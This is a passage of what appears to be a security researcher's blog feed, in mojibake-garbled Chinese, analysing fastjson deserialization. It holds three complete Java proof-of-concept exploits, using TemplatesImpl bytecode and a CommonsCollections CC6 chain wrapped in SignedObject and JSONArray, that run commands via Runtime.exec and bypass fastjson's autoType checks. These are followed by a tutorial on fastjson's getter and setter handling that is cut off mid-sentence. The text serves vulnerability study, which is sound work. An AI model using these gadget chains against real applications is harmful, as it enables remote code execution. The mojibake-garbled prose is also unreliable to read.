ç¬¬ä¸€æ¬¡æ”¾å…¥ä¸€ä¸ªTemplatesImplç±»å®ä¾‹ï¼Œç„¶åç¬¬äºŒæ¬¡æ”¾å…¥çš„badçš„TemplatesImplç±»å°±æ˜¯åº”ç”¨ç±»å‹ï¼Œå¯ä»¥ç»•è¿‡ã€‚\nJSONArrayä¹Ÿä¸€æ ·ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONArray; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; import java.util.ArrayList; import java.util.HashMap; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bad); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } setç±»å‹çš„ï¼š\nä½¿ç”¨HashSetï¼Œä½†æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œä¼¼ä¹å½“æ”¾å…¥åä¼šè‡ªå·±å†è¿›è¡Œæ’åºï¼Œå¯¼è‡´ä¸ä¼šæ˜¯ç¬¬äºŒæ¬¡è°ƒç”¨writeObject()æ—¶æ˜¯JSONArrayç±»ï¼Œå‘ç°æ— è®ºä»€ä¹ˆå…ˆåæ”¾å…¥é¡ºåºï¼Œæœ€åéƒ½æ˜¯JSONArrayä¸º0ï¼ŒTemplatesImplä¸º1ï¼Œå¯¼è‡´ä¸èƒ½åœ¨æƒ³åˆ©ç”¨çš„åœ°æ–¹å½¢æˆå¼•ç”¨ç±»å‹ã€‚\næ—¢ç„¶éƒ½æ˜¯è°ƒç”¨getteræ–¹æ³•äº†ï¼Œé‚£ä¹ˆæ˜¯è‚¯å®šå¯ä»¥æ‰“äºŒæ¬¡ååºåˆ—åŒ–çš„ï¼Œä»¥ä¸€ä¸ªäºŒæ¬¡ååºåˆ—åŒ–CC6ä¸ºä¾‹ï¼š\n1.2.48ç‰ˆæœ¬ç›´æ¥æ‰“ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import java.lang.reflect.Field; import java.util.HashMap; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import com.alibaba.fastjson.JSONArray; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import javax.management.BadAttributeValueExpException; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); JSONArray jsonArray = new JSONArray(); jsonArray.add(signedObject); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); setFieldValue(bad,\u0026#34;val\u0026#34;,jsonArray); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } é«˜ç‰ˆæœ¬çš„ç¦äº†è¿™ä¸ªäºŒæ¬¡ååºåˆ—åŒ–ç±»ï¼š\n1 autoType is not support. java.security.SignedObject åŒæ ·ç»•ä¸€ä¸‹å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package org.example; import java.lang.reflect.Field; import java.util.ArrayList; import java.util.HashMap; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import com.alibaba.fastjson.JSONArray; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import javax.management.BadAttributeValueExpException; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); JSONArray jsonArray = new JSONArray(); jsonArray.add(signedObject); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); setFieldValue(bad,\u0026#34;val\u0026#34;,jsonArray); ArrayList list = new ArrayList(); list.add(signedObject); list.add(bad); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(list); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } â€”â€”â€”â€”\næœ€åï¼Œå¯¹äºè¿™é‡Œçš„åˆ©ç”¨æ–¹æ³•ï¼Œæ ¹æ®y4å¸ˆå‚…è¯´æ³•å¦‚ä¸‹ï¼š\næœ‰ç‚¹ä¸æ˜¯å¾ˆæ‡‚ï¼Œåé¢å¯¹åº•å±‚ç†è§£æ›´æ·±äº†å†æ¥çœ‹çœ‹è¿™ä¸ªç»•è¿‡æ–¹æ³•ï¼Œæ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒæœ‰ç”¨çš„ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/\nhttps://nivi4.notion.site/fastjson-17753526a00246f9b146eca7354b8835\n","date":"2025-04-17T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/","title":"fastjsonååºåˆ—åŒ–è°ƒç”¨é“¾åˆ†æ"},{"content":"fastjsonååºåˆ—åŒ– fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ä¸ºjsonå­—ç¬¦ä¸²ä»¬ï¼Œä¹Ÿå¯ä»¥ååºåˆ—åŒ–ä¸€ä¸ªjsonå­—ç¬¦ä¸²ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå…¶å®ä¹Ÿå°±æ˜¯å’Œjacksonå·®ä¸å¤šçš„ã€‚\nåŸºæœ¬è¿‡ç¨‹äº†è§£ åœ¨è¿™é‡Œå…ˆæ¥çœ‹jsonåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚\nå¯¼å…¥ä¾èµ–\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; å¦‚ä¸‹å°±æ˜¯ä¸€ä¸ªç®€å•çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package fastjson; import com.alibaba.fastjson.JSON; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //åºåˆ—åŒ– System.out.println(\u0026#34;=====åºåˆ—åŒ–=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //ååºåˆ—åŒ– System.out.println(\u0026#34;=====ååºåˆ—åŒ–=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { private String name; private int age; public Object object; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 =====åºåˆ—åŒ–===== {\u0026#34;age\u0026#34;:1233,\u0026#34;name\u0026#34;:\u0026#34;fupanc\u0026#34;} =====ååºåˆ—åŒ–===== fupanc 1233 è¿™é‡Œçš„è½¬æ¢è¿‡ç¨‹å…¶å®æ˜¯å’Œjacksonå·®ä¸å¤šçš„ï¼Œéƒ½æ˜¯è°ƒç”¨çš„getterå’Œsetteræ¥è¿›è¡Œçš„å–å€¼ä¸èµ‹å€¼ã€‚\n@JSONFieldæ³¨è§£ ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨ï¼Œå…ˆç®€å•äº†è§£ä¸€ä¸‹ï¼Œé€šè¿‡è¿™ä¸ªæ³¨è§£ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰å­—æ®µçš„åç§°çš„è¾“å‡ºï¼Œå¦‚ä¸‹demoï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //åºåˆ—åŒ– System.out.println(\u0026#34;=====åºåˆ—åŒ–=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //ååºåˆ—åŒ– System.out.println(\u0026#34;=====ååºåˆ—åŒ–=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { @JSONField(name=\u0026#34;user_name\u0026#34;) private String name; @JSONField(name=\u0026#34;user_age\u0026#34;) private int age; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } æ­¤æ—¶çš„è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 =====åºåˆ—åŒ–===== {\u0026#34;user_age\u0026#34;:1233,\u0026#34;user_name\u0026#34;:\u0026#34;fupanc\u0026#34;} =====ååºåˆ—åŒ–===== fupanc 1233 ä»ç»“æœå¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œçš„å…·ä½“ç¤ºä¾‹ï¼Œä¹Ÿå°±æ˜¯å½“ä½¿ç”¨äº†@JSONFieldè¿™ä¸ªæ³¨è§£ï¼Œåºåˆ—åŒ–æ—¶ä¼šå°†è¿™ä¸ªæ³¨è§£æ ‡æ³¨çš„å­—æ®µçš„å­—æ®µååºåˆ—åŒ–ä¸ºæ³¨è§£æŒ‡å®šçš„å­—æ®µåï¼Œè€Œååºåˆ—åŒ–æ—¶å°±ä¼šè‡ªåŠ¨è¯†åˆ«åˆ°è¿™ä¸ªæ³¨è§£æ ‡æ³¨çš„å­—æ®µä»è€ŒæˆåŠŸååºåˆ—åŒ–èµ‹å€¼ã€‚\nè°ƒè¯•åˆ†æ è°ƒè¯•åˆ†æä¸€ä¸‹è¿™é‡Œè·å–getterå’Œsetterçš„è¿‡ç¨‹ï¼Œè¿™é‡Œå°±æ¥ç®€å•è¯´è¯´æˆ‘è¿™é‡Œçš„è°ƒè¯•è¿‡ç¨‹\nåºåˆ—åŒ–è¿‡ç¨‹ åœ¨JSON.toJSONString()å¤„æ‰“ä¸€ä¸ªæ–­ç‚¹å¼€å§‹è°ƒè¯•ï¼Œé€šè¿‡è°ƒè¯•æ—¶çš„å˜é‡çš„å€¼çš„æ›¿æ¢ï¼Œåœ¨è¿™ä¸€æ­¥åå‘ç°è°ƒç”¨å˜é‡å­˜åœ¨äº†getteræ–¹æ³•ï¼š\næ­¤æ—¶çš„è°ƒç”¨æ ˆä¸ºï¼š\n1 2 3 4 5 write:272, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:14, Fastjson_Test (fastjson) æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªgetObjectWriter()æ–¹æ³•ï¼Œç„¶åä¸€ç›´è·Ÿè¿›ï¼Œå¯ä»¥å‘ç°å…¶å®ä¸»è¦çš„è·å–åˆ°getteræ–¹æ³•å­˜åœ¨å¦‚ä¸‹ï¼š\nè·Ÿè¿›è¿™ä¸ªcreateJavaBeanSerializer()æ–¹æ³•ï¼š\nè¿™é‡Œä¸»è¦èµ·ä½œç”¨çš„ä»£ç ä¹Ÿåœ¨å›¾ä¸­æ ‡æ³¨äº†ï¼Œæœ€é‡è¦çš„å°±æ˜¯æ–¹æ³•å†…éƒ¨çš„ç¬¬ä¸€è¡Œä»£ç ï¼Œè·Ÿè¿›è¿™é‡Œè°ƒç”¨çš„buildBeanInfo()æ–¹æ³•ï¼š\nå†è·Ÿè¿›è¿™é‡Œçš„parserAllFieldToCache()æ–¹æ³•ï¼š\nå¸¸è§çš„è·å–å­—æ®µåçš„æ“ä½œï¼Œè·å–åˆ°åè¿˜å°†èµ·æ”¾å…¥åˆ°äº†è¿™å½¢å‚ä¼ å…¥çš„HashMapç±»å®ä¾‹ä¸­ï¼Œè¿˜å¯ä»¥çœ‹åˆ°æ˜¯å°è¯•è·å–äº†çˆ¶ç±»çš„å­—æ®µå€¼ã€‚\nå›åˆ°buildBeanInfo()æ–¹æ³•ï¼Œå¦å¤–ä¸€ä¸ªéå¸¸é‡è¦çš„æ–¹æ³•å°±æ˜¯computeGetters()æ–¹æ³•ï¼š\nå¯ä»¥å¾ˆå®¹æ˜“çœ‹å‡ºæ¥è¿™é‡Œå°±æ˜¯ä¸€ä¸ªè·å–æ–¹æ³•çš„æ“ä½œï¼Œæœ€åè¿˜æ˜¯å°†å…¶æ”¾å…¥åˆ°é”®å€¼å¯¹ä¸­ï¼š\nè¿‡ç¨‹å°±ä¸å…·ä½“è¯´äº†ï¼Œå¯ä»¥è‡ªå·±è·Ÿä¸€ä¸‹ã€‚å†å›åˆ°buildBeanInfo()æ–¹æ³•ï¼Œç„¶åå¯¹å­—æ®µè¿›è¡Œäº†ä¸€ä¸‹æ’åºï¼Œå†è¿”å›äº†ä¸€ä¸ªå®ä¾‹åŒ–çš„SerializeBeanInfoç±»ï¼š\næ‰€ä»¥è¿™é‡Œå…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªè·å–åˆ°ç±»ä¸­çš„ä¿¡æ¯çš„å‡½æ•°è°ƒç”¨çš„æ“ä½œï¼Œå…¶å®åŸºæœ¬è·å–åˆ°äº†éœ€è¦çš„æ‰€æœ‰æ¶ˆæ¯ã€‚ç„¶åå°±ä¼šè°ƒç”¨åˆ°createJavaBeanSerializer()æ–¹æ³•ï¼š\nåç»­å…·ä½“ä¹Ÿå°±ä¸è¯´äº†ï¼Œéƒ½æ˜¯ä¸€äº›è¿›è¡Œå¤„ç†çš„æ“ä½œã€‚\næœ€åè¿™é‡Œèµ‹å€¼çš„getterså°±æ˜¯åç»­è¦ç”¨åˆ°çš„ï¼Œæ­¤æ—¶çš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;init\u0026gt;:73, JavaBeanSerializer (com.alibaba.fastjson.serializer) createJavaBeanSerializer:152, SerializeConfig (com.alibaba.fastjson.serializer) createJavaBeanSerializer:126, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:580, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:355, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:329, JSONSerializer (com.alibaba.fastjson.serializer) write:272, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:14, Fastjson_Test (fastjson) å…¶ä»–è¿‡ç¨‹å°±ä¸å¤šè¯´äº†ï¼Œé‡ç‚¹å°±æ˜¯è·å–åˆ°getteræ–¹æ³•ï¼Œå¯¹äºåé¢çš„è°ƒç”¨getteræ–¹æ³•æ¥è·å–å€¼ï¼Œä»£ç å¦‚ä¸‹ï¼š\nè°ƒç”¨invoke()æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 get:450, FieldInfo (com.alibaba.fastjson.util) getPropertyValueDirect:110, FieldSerializer (com.alibaba.fastjson.serializer) write:196, JavaBeanSerializer (com.alibaba.fastjson.serializer) write:275, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:13, Fastjson_Test (fastjson) è‡ªå·±è°ƒä¸€ä¸‹å°±çŸ¥é“äº†ã€‚\nååºåˆ—åŒ–è¿‡ç¨‹ æ‰“æ–­ç‚¹äºJSON.parseObject()æ–¹æ³•ï¼Œååºåˆ—åŒ–ï¼Œä¸»è¦è¿˜æ˜¯å¯¹setteræ–¹æ³•çš„è·å–å’Œè°ƒç”¨ã€‚è°ƒè¯•å‘ç°è·å–åˆ°ç±»æ˜¯åœ¨å¦‚ä¸‹æ–¹æ³•ï¼š\né‚£ä¹ˆæƒ³è¦è·å–åˆ°çš„è¿‡ç¨‹å°±åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œæ­¤æ—¶è°ƒç”¨æ ˆï¼š\n1 2 3 4 parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:18, Fastjson_Test (fastjson) ç»§ç»­è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼Œä¸€ç›´èµ°ï¼Œçœ‹åˆ°ä¸€ä¸ªéå¸¸ç†Ÿæ‚‰çš„å˜é‡ï¼š\nJavaBeanInfoï¼Œåº”è¯¥åŒæ ·æ˜¯ä¸€ä¸ªè·å–åˆ°ç±»ç›¸å…³å±æ€§çš„æ“ä½œï¼Œè·Ÿè¿›è¿™é‡Œè°ƒç”¨çš„build()æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°åˆæ˜¯ä¸€ä¸ªè·å–ç±»çš„å˜é‡ä»¥åŠæ–¹æ³•çš„å¤„ç†ï¼š\nåé¢å°±æ˜¯å¯¹æ–¹æ³•çš„å¤„ç†ï¼Œæ¥è·å–åˆ°setteræ–¹æ³•ï¼Œè¿˜æœ‰å¤„ç†getteræ–¹æ³•çš„é€»è¾‘ï¼Œè¿™é‡Œä¹Ÿå°±ä¸å¤šè¯´äº†ï¼Œåœ¨è¿™é‡Œçš„å¤„ç†æ–¹æ³•éƒ½æ˜¯å°†è·å–åˆ°çš„ç±»å±æ€§ï¼Œæ”¾å…¥åˆ°ä¸€ä¸ªFieldInfoç±»ä¸­ï¼Œç„¶åæ”¾å…¥åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œæœ€åå®ä¾‹åŒ–ä¸€ä¸ªJavaBeanç±»ï¼š\nç»§ç»­è·Ÿè¿›è¿™ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œç„¶åè¿˜æ˜¯å°†å…¶èµ‹å€¼ç»™è¿™ä¸ªç±»çš„å˜é‡ï¼Œå’Œåºåˆ—åŒ–é‚£é‡Œå¤§ç›¸å¾„åº­ï¼š\nå…·ä½“å¦‚ä¸‹ï¼š\nä¹Ÿå°±æ˜¯è·å–åˆ°äº†ä¸€ä¸ªå˜é‡çš„setteræ–¹æ³•ã€‚é‚£ä¹ˆå“ªé‡Œå¯¹è¿™ä¸ªsetterè¿›è¡Œäº†è°ƒç”¨å‘¢ï¼Œè¿™é‡Œèµ‹å€¼å®Œäº†ç„¶åï¼Œä¸€ç›´å›é€€ï¼Œåˆ°å¦‚ä¸‹æ–¹æ³•ï¼š\nè¿™é‡Œæ˜¯å°†ç”Ÿæˆçš„derializeræ”¾è¿›ä¸€ä¸ªé”®å€¼å¯¹ï¼Œç„¶åä¸€ç›´å›é€€ï¼Œä¼šè°ƒç”¨deserialzeæ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œç„¶åä¸€ç›´å¾€åé¢èµ°ï¼Œè¿™é‡Œä¼šè°ƒç”¨createInstance()æ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹ï¼š\nä¸»è¦æ˜¯åˆ©ç”¨çš„æ— å‚æ„é€ æ–¹æ³•ï¼š\ncreateInstance()æ–¹æ³•ä¹Ÿå°±æ˜¯è¿”å›çš„è¿™ä¸ªobjectï¼Œå›åˆ°è°ƒç”¨çš„deserialzeæ–¹æ³•ï¼Œç»§ç»­å¾€åï¼Œä¼šè°ƒç”¨setValue()æ–¹æ³•æ¥è¿›è¡Œèµ‹å€¼ï¼š\nsetValue()æ–¹æ³•å†…éƒ¨åŒæ ·è°ƒç”¨äº†invoke()æ–¹æ³•è¿›è¡Œèµ‹å€¼ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œå°±æ˜¯å¯¹å‰ä¸€ä¸ªç±»å®ä¾‹è°ƒç”¨çš„setAge()æ–¹æ³•ï¼Œä»è€Œå¯ä»¥æˆåŠŸèµ‹å€¼ï¼Œå¹¶ä¸”æœ€åæ˜¯è¿”å›çš„è¿™ä¸ªèµ‹å€¼å®Œäº†çš„ç±»å®ä¾‹ï¼š\næœ€åå°±æˆåŠŸjsonååºåˆ—åŒ–å¾—åˆ°äº†æŒ‡å®šçš„ç±»ã€‚\nä»ä¸Šé¢çš„æ•´ä¸ªè¿‡ç¨‹æ¥çœ‹ï¼Œå¯ä»¥çœ‹å‡ºç¡®å®æ˜¯è°ƒç”¨çš„getterå’Œsetteræ¥è¿›è¡Œçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å–å€¼ä¸èµ‹å€¼ï¼Œç°åœ¨æ¥çœ‹çœ‹è¿™é‡Œçš„å…·ä½“åˆ©ç”¨ã€‚\n@typeå±æ€§è¯´æ˜ åœ¨å‰é¢æˆ‘ä»¬éƒ½æ˜¯å¯¹ä¸€ä¸ªç±»è¿›è¡Œçš„jsonåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œä»è€Œå¯ä»¥è·å–å¹¶è°ƒç”¨åˆ°å¯¹åº”ç±»çš„getterå’Œsetterï¼Œä½†æ˜¯æ—¢ç„¶éƒ½æ˜¯è·å–getteräº†ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯è¦å°è¯•å¸¸è§çš„Templatesé“¾ï¼Œé‚£ä¹ˆæ€ä¹ˆå¯ä»¥æŒ‡å®šä¸€ä¸ªç±»çš„åºåˆ—åŒ–å‘¢ï¼Ÿè¿™å°±ä¸@typeå±æ€§æœ‰å…³äº†ï¼Œè¿™ä¸ªå±æ€§å¯ä»¥ç›´æ¥è§£ææŒ‡å®šçš„ç±»ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå¦‚ä¸‹å°è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) { JSONObject person1 = JSON.parseObject(\u0026#34;{\\\u0026#34;user_age\\\u0026#34;:1233,\\\u0026#34;user_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;}\u0026#34;); System.out.println(person1); } } ç®€å•è°ƒè¯•ç†è§£ä¸€ä¸‹ï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œå¤§æ¦‚å°±æ˜¯ä¸€ä¸ªå°†Stringç±»å‹çš„jsonå­—ç¬¦ä¸²ç»™è§£ææˆä¸€ä¸ªJSONObjectå¯¹è±¡ï¼Œå¯¹è±¡å­˜åœ¨å¦‚ä¸‹å†…å®¹ï¼š\né‚£ä¹ˆä½†æ˜¯è¿™æ 